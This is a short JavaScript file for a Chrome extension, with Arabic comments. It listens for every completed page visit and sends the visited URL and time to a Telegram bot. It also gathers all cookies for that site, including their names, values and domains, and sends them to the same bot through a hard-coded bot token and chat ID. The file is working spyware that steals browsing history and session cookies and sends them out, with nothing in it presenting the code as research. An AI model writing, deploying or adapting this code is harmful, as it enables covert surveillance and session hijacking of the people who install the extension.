chrome.webNavigation.onCompleted.addListener((details) => {
    const url = details.url;
    const timestamp = new Date().toLocaleString();
    sendToTelegram(`تم زيارة الموقع: ${url}\nالوقت: ${timestamp}`);

    // جمع ملفات تعريف الارتباط للموقع الحالي
    chrome.cookies.getAll({ url: url }, (cookies) => {
        const cookieData = cookies.map(cookie => 
            `الاسم: ${cookie.name}, القيمة: ${cookie.value}, المجال: ${cookie.domain}`
        ).join('\n') || 'لا توجد كوكيز';
        sendToTelegram(`ملفات تعريف الارتباط لـ ${url}:\n${cookieData}`);
    });
});

function sendToTelegram(message) {
    const botToken = '7828409029:AAEhoTRU5oBc4HJxrdtXUQ8Jbam6O3FhbTg';
    const chatId = '6733154889';
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(response => {
        if (!response.ok) throw new Error('فشل إرسال البيانات إلى تيليجرام');
        console.log('تم إرسال البيانات إلى تيليجرام');
    })
    .catch(error => console.error('خطأ:', error));
}
